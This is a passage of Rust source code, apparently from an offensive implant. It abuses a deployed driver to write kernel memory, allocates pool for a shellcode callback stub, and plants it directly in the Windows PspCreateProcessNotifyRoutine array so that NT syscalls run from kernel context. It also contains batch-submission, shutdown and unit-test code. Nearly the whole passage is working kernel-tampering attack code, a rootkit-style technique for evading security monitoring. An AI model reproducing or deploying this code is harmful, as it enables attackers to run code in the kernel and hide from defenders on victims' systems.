        .context("no empty callback slot found in PspCreateProcessNotifyRoutine array")?;

    // Step 6: Resolve NT function addresses for the dispatch table.
    let mut fn_table = [0u64; NUM_SYSCALL_TYPES];
    for (i, name) in SYSCALL_KERNEL_NAMES.iter().enumerate() {
        match discover::resolve_kernel_symbol(driver, device_handle, kernel_base, name) {
            Ok(addr) => {
                tracing::debug!("proxy: resolved {} at {:#x}", name, addr);
                fn_table[i] = addr;
            }
            Err(e) => {
                tracing::warn!(
                    "proxy: failed to resolve {}: {:#} — ops using it will fail",
                    name,
                    e
                );
            }
        }
    }

    // Step 7: Build the callback stub with embedded function pointer table.
    let patched_stub = build_callback_stub(region_addr, &fn_table);

    // Step 8: Allocate kernel pool for the callback stub and write it.
    let stub_addr = unsafe {
        allocate_kernel_pool(driver, device_handle, cr3, kernel_base, patched_stub.len())
            .context("proxy init: failed to allocate callback stub memory")?
    };

    unsafe {
        write_bytes(driver, device_handle, cr3, stub_addr, &patched_stub)
            .context("proxy init: failed to write callback stub")?;
    }

    tracing::info!(
        "proxy: callback stub ({}) written at {:#x}",
        patched_stub.len(),
        stub_addr
    );

    // Create an EX_CALLBACK_ROUTINE_BLOCK for our callback.
    // Structure:
    //   +0x00: LIST_ENTRY (Flink=0, Blink=0) — 16 bytes
    //   +0x10: RefCount — 4 bytes (set to 1)
    //   +0x14: padding — 4 bytes
    //   +0x18: Callback function pointer — 8 bytes
    //   Total: 0x20 = 32 bytes
    let block_size = 0x20usize;
    let block_addr = unsafe {
        allocate_kernel_pool(driver, device_handle, cr3, kernel_base, block_size)
            .context("proxy init: failed to allocate callback block")?
    };

    let mut block_data = [0u8; 0x20];
    // RefCount = 1 at offset +0x10
    block_data[0x10..0x14].copy_from_slice(&1u32.to_le_bytes());
    // Callback function pointer at offset +0x18
    block_data[0x18..0x20].copy_from_slice(&stub_addr.to_le_bytes());

    unsafe {
        write_bytes(driver, device_handle, cr3, block_addr, &block_data)
            .context("proxy init: failed to write callback block")?;
    }

    // Write the block address into the PspCreateProcessNotifyRoutine slot.
    // The entry is an EX_CALLBACK_ROUTINE_BLOCK pointer, which is stored
    // as a pointer with the low bit cleared (used as a flag for registration).
    let encoded_block = block_addr | 1; // Set registration bit
    unsafe {
        write_bytes(
            driver,
            device_handle,
            cr3,
            psp_array + (slot_index as u64) * 8,
            &encoded_block.to_le_bytes(),
        )
        .context("proxy init: failed to register callback in array")?;
    }

    // Store stub address and callback index.
    {
        let mut s = CALLBACK_STUB_ADDR.lock_recover();
        *s = stub_addr;
    }
    {
        let mut i = CALLBACK_INDEX.lock_recover();
        *i = slot_index;
    }

    tracing::info!(
        "proxy: callback registered at index {}, stub at {:#x}, block at {:#x}",
        slot_index,
        stub_addr,
        block_addr
    );

    Ok(())
}

/// Submit a batch of operations and wait for kernel callback execution.
///
/// The operations are written into the shared proxy region, the state is
/// set to Pending, and the function polls until the kernel callback sets
/// the state to Completed or Error (or a timeout is reached).
///
/// # Arguments
/// * `batch` - The batch of operations to submit
///
/// # Returns
/// A vector of `ProxyResult`, one for each operation in the batch.
///
/// # Errors
/// Returns an error if the proxy is not initialized, the batch is too large,
/// or the kernel callback times out.
pub fn proxy_batch(batch: &ProxyBatch) -> Result<Vec<ProxyResult>> {
    if batch.ops.is_empty() {
        return Ok(Vec::new());
    }
    if batch.ops.len() > MAX_OPS_PER_BATCH {
        bail!(
            "batch size {} exceeds maximum {}",
            batch.ops.len(),
            MAX_OPS_PER_BATCH
        );
    }

    let region_addr = *PROXY_REGION_ADDR.lock_recover();
    if region_addr == 0 {
        bail!("proxy not initialized — call init() first");
    }

    let region_ptr = region_addr as *mut u8;

    // Step 1: Write operations to shared region.
    unsafe {
        for (i, op) in batch.ops.iter().enumerate() {
            let op_bytes = op.to_bytes();
            let offset = PROXY_HEADER_SIZE + i * PROXY_OP_SIZE;
            std::ptr::copy_nonoverlapping(op_bytes.as_ptr(), region_ptr.add(offset), PROXY_OP_SIZE);
        }

        // Write op count.
        let count_bytes = (batch.ops.len() as u32).to_le_bytes();
        std::ptr::copy_nonoverlapping(count_bytes.as_ptr(), region_ptr.add(0xC), 4);

        // Memory barrier to ensure all writes are visible before state change.
        std::sync::atomic::fence(std::sync::atomic::Ordering::Release);

        // Set state to Pending.
        let pending_bytes = (ProxyState::Pending as u32).to_le_bytes();
        std::ptr::copy_nonoverlapping(pending_bytes.as_ptr(), region_ptr.add(8), 4);
    }

    // Step 2: Poll for completion.
    let mut iterations = 0u64;
    loop {
        let state_u32 = unsafe {
            let mut buf = [0u8; 4];
            std::ptr::copy_nonoverlapping(region_ptr.add(8), buf.as_mut_ptr(), 4);
            u32::from_le_bytes(buf)
        };

        match ProxyState::from_u32(state_u32) {
            Some(ProxyState::Completed) => break,
            Some(ProxyState::Error) => {
                bail!("kernel proxy callback reported error");
            }
            Some(ProxyState::Pending) => {
                // Still waiting.
                iterations += 1;
                if iterations >= MAX_POLL_ITERATIONS {
                    bail!("kernel proxy timeout after {} iterations", iterations);
                }
                std::thread::sleep(std::time::Duration::from_micros(POLL_INTERVAL_US));
            }
            Some(ProxyState::Idle) => {
                // State reverted to idle unexpectedly — callback may have
                // already processed a previous batch.
                bail!("proxy state unexpectedly reverted to Idle");
            }
            None => {
                bail!("proxy state corrupted: invalid value {}", state_u32);
            }
        }
    }

    // Step 3: Read results.
    let mut results = Vec::with_capacity(batch.ops.len());
    unsafe {
        for i in 0..batch.ops.len() {
            let offset = PROXY_HEADER_SIZE + i * PROXY_OP_SIZE;
            let mut op_bytes = [0u8; PROXY_OP_SIZE];
            std::ptr::copy_nonoverlapping(
                region_ptr.add(offset),
                op_bytes.as_mut_ptr(),
                PROXY_OP_SIZE,
            );
            let op = ProxyOp::from_bytes(&op_bytes).context("failed to parse proxy result")?;
            results.push(ProxyResult {
                status: op.status,
                output: op.output,
            });
        }

        // Reset state to Idle for next batch.
        let idle_bytes = (ProxyState::Idle as u32).to_le_bytes();
        std::ptr::copy_nonoverlapping(idle_bytes.as_ptr(), region_ptr.add(8), 4);
    }

    Ok(results)
}

/// Submit a single proxied operation and wait for completion.
///
/// Convenience wrapper around `proxy_batch()` for a single operation.
///
/// # Arguments
/// * `opcode` - The syscall type to execute
/// * `args` - Up to 6 arguments for the syscall
///
/// # Returns
/// The result of the proxied operation.
pub fn proxy_single(opcode: SyscallType, args: [u64; 6]) -> Result<ProxyResult> {
    let mut batch = ProxyBatch::new();
    batch.push(ProxyOp::new(opcode, args));
    let mut results = proxy_batch(&batch)?;
    results.pop().context("no result returned from proxy batch")
}

/// Check whether the proxy subsystem is initialized and ready.
///
/// # Returns
/// `true` if the proxy has been initialized (shared region allocated
/// and callback registered).
pub fn is_initialized() -> bool {
    let region_addr = *PROXY_REGION_ADDR.lock_recover();
    region_addr != 0
}

/// Shut down the proxy subsystem and unregister the kernel callback.
///
/// This function:
/// 1. Sets the shared region state to Idle
/// 2. Unregisters the callback from PspCreateProcessNotifyRoutine
/// 3. Frees the callback stub and shared region
///
/// # Safety
/// Must be called before agent exit to avoid leaving stale kernel callbacks.
pub fn shutdown(session_key: &[u8]) -> Result<()> {
    let region_addr = *PROXY_REGION_ADDR.lock_recover();
    if region_addr == 0 {
        return Ok(()); // Not initialized, nothing to do.
    }

    let deployed = deploy::get_deployed_driver()
        .or_else(|| deploy::deploy(&[], session_key).ok())
        .context("shutdown: no deployed driver")?;

    let driver = deployed.driver;
    let device_handle = deployed.device_handle.context("no device handle")?;

    let cr3 = *PROXY_CR3.lock_recover();
    let kernel_base =
        discover::get_kernel_base().context("shutdown: failed to resolve kernel base")?;

    // Zero the state in the shared region.
    if region_addr != 0 {
        unsafe {
            let region_ptr = region_addr as *mut u8;
            let idle_bytes = (ProxyState::Idle as u32).to_le_bytes();
            std::ptr::copy_nonoverlapping(idle_bytes.as_ptr(), region_ptr.add(8), 4);
        }
    }

    let slot_index = *CALLBACK_INDEX.lock_recover();
    if slot_index != usize::MAX {
        // Resolve the callback array and clear our slot.
        let psp_array = discover::resolve_kernel_symbol(
            driver,
            device_handle,
            kernel_base,
            "PspCreateProcessNotifyRoutine",
        )
        .context("shutdown: failed to resolve PspCreateProcessNotifyRoutine")?;

        let entry_addr = psp_array + (slot_index as u64) * 8;
        let zero = 0u64.to_le_bytes();
        unsafe {
            write_bytes(driver, device_handle, cr3, entry_addr, &zero)
                .context("shutdown: failed to clear callback slot")?;
        }

        tracing::info!("proxy: unregistered callback at index {}", slot_index);
    }

    // Free user-mode shared region.
    if region_addr != 0 {
        let mut base = region_addr as usize;
        let mut size = 0usize;
        unsafe {
            let _ = crate::syscall!(
                "NtFreeVirtualMemory",
                usize::MAX as u64,
                &mut base as *mut _ as u64,
                &mut size as *mut _ as u64,
                0x8000u64 // MEM_RELEASE
            );
        }
    }

    // Clear global state.
    {
        let mut addr = PROXY_REGION_ADDR.lock_recover();
        *addr = 0;
    }
    {
        let mut s = CALLBACK_STUB_ADDR.lock_recover();
        *s = 0;
    }
    {
        let mut i = CALLBACK_INDEX.lock_recover();
        *i = usize::MAX;
    }

    tracing::info!("proxy: subsystem shut down");
    Ok(())
}

// ── Unit tests ──────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_proxy_state_roundtrip() {
        assert_eq!(ProxyState::from_u32(0), Some(ProxyState::Idle));
        assert_eq!(ProxyState::from_u32(1), Some(ProxyState::Pending));
        assert_eq!(ProxyState::from_u32(2), Some(ProxyState::Completed));
        assert_eq!(ProxyState::from_u32(3), Some(ProxyState::Error));
        assert_eq!(ProxyState::from_u32(99), None);
    }

    #[test]
    fn test_syscall_type_roundtrip() {
        for i in 0..14u32 {
            assert!(
                SyscallType::from_u32(i).is_some(),
                "SyscallType::from_u32({}) should be Some",
                i
            );
        }
        assert_eq!(SyscallType::from_u32(14), None);
    }

    #[test]
    fn test_proxy_op_serialization_roundtrip() {
        let op = ProxyOp::new(
            SyscallType::NtAllocateVirtualMemory,
            [0xFFFFFFFFFFFFFFFF, 0x1000, 0x3000, 0x04, 0, 0],
        );
        let bytes = op.to_bytes();
        let restored = ProxyOp::from_bytes(&bytes).expect("roundtrip should succeed");

        assert_eq!(restored.opcode, SyscallType::NtAllocateVirtualMemory);
        assert_eq!(restored.args[0], 0xFFFFFFFFFFFFFFFF);
        assert_eq!(restored.args[1], 0x1000);
        assert_eq!(restored.args[2], 0x3000);
        assert_eq!(restored.args[3], 0x04);
        assert_eq!(restored.args[4], 0);
        assert_eq!(restored.args[5], 0);
    }

    #[test]
    fn test_proxy_op_status_field() {
        let mut op = ProxyOp::new(SyscallType::NtClose, [0x1234, 0, 0, 0, 0, 0]);
        op.status = 0xC0000008_u32 as i32; // STATUS_INVALID_HANDLE
        op.output = 0xDEAD;

        let bytes = op.to_bytes();
        let restored = ProxyOp::from_bytes(&bytes).unwrap();

        assert_eq!(restored.status, 0xC0000008_u32 as i32);
        assert_eq!(restored.output, 0xDEAD);
    }

    #[test]
    fn test_proxy_batch_operations() {
        let mut batch = ProxyBatch::new();
        assert!(batch.is_empty());
        assert_eq!(batch.len(), 0);

        batch.push(ProxyOp::new(SyscallType::NtClose, [1, 0, 0, 0, 0, 0]));
        assert!(!batch.is_empty());
        assert_eq!(batch.len(), 1);

        batch.push(ProxyOp::new(SyscallType::NtClose, [2, 0, 0, 0, 0, 0]));
        assert_eq!(batch.len(), 2);
    }

    #[test]
    fn test_proxy_batch_max_size() {
        let mut batch = ProxyBatch::new();
        for i in 0..MAX_OPS_PER_BATCH + 5 {
            batch.push(ProxyOp::new(
                SyscallType::NtClose,
                [i as u64, 0, 0, 0, 0, 0],
            ));
        }
        // Should be capped at MAX_OPS_PER_BATCH
        assert_eq!(batch.len(), MAX_OPS_PER_BATCH);
    }

    #[test]
    fn test_proxy_magic() {
        assert_eq!(
            PROXY_MAGIC,
            [b'O', b'R', b'K', b'P', b'R', b'X', b'0', b'1']
        );
    }

    #[test]
    fn test_proxy_op_size() {
        // ProxyOp wire format must be exactly 64 bytes.
        assert_eq!(PROXY_OP_SIZE, 64);
        // Verify the to_bytes output is the correct size.
        let op = ProxyOp::new(SyscallType::NtClose, [0, 0, 0, 0, 0, 0]);
        assert_eq!(op.to_bytes().len(), 64);
    }

    #[test]
    fn test_proxy_header_layout() {
        // Verify our header size constant matches the documented layout.
        // Header: 8 (magic) + 4 (state) + 4 (count) + 8 (seq) + 248 (reserved) = 0x118
        assert_eq!(PROXY_HEADER_SIZE, 0x118);
    }

    #[test]
    fn test_proxy_region_size() {
        // Region = header + max_ops * op_size
        let expected = PROXY_HEADER_SIZE + MAX_OPS_PER_BATCH * PROXY_OP_SIZE;
        assert_eq!(PROXY_REGION_SIZE, expected);
    }

    #[test]
    fn test_build_callback_stub_produces_valid_shellcode() {
        // build_callback_stub should produce non-trivial shellcode.
        let fn_table = [0u64; NUM_SYSCALL_TYPES];
        let stub = build_callback_stub(0xDEADBEEF_00000000, &fn_table);
        // Must have at least the function pointer table + code
        assert!(stub.len() > 112, "stub too short: {}", stub.len());
        // The function pointer table should be all zeros (we passed zeros)
        let table_start = stub.len() - 112;
        for i in 0..14 {
            let offset = table_start + i * 8;
            let val = u64::from_le_bytes(stub[offset..offset + 8].try_into().unwrap());
            assert_eq!(val, 0u64, "fn_table[{}] should be 0", i);
        }
    }

    #[test]
    fn test_dispatch_queue_concurrency() {
        // Test that multiple ProxyOps can be serialized and deserialized
        // in sequence (simulating the dispatch queue).
        let ops: Vec<ProxyOp> = (0..10)
            .map(|i| {
                let mut op = ProxyOp::new(
                    SyscallType::NtAllocateVirtualMemory,
                    [i, i + 1, i + 2, 0, 0, 0],
                );
                op.status = 0; // success
                op.output = 0x1000 + i;
                op
            })
            .collect();

        // Serialize all ops
        let serialized: Vec<[u8; PROXY_OP_SIZE]> = ops.iter().map(|op| op.to_bytes()).collect();

        // Deserialize all ops
        let deserialized: Vec<ProxyOp> = serialized
            .iter()
            .map(|buf| ProxyOp::from_bytes(buf).unwrap())
            .collect();

        assert_eq!(deserialized.len(), ops.len());
        for (orig, restored) in ops.iter().zip(deserialized.iter()) {
            assert_eq!(orig.opcode, restored.opcode);
            assert_eq!(orig.args, restored.args);
            assert_eq!(orig.status, restored.status);
            assert_eq!(orig.output, restored.output);
        }
    }

    #[test]
    fn test_is_initialized_when_not_initialized() {
        // In test mode, PROXY_REGION_ADDR should be 0.
        let region_addr = *PROXY_REGION_ADDR.lock_recover();
        assert_eq!(region_addr, 0);
        assert!(!is_initialized());
    }
}
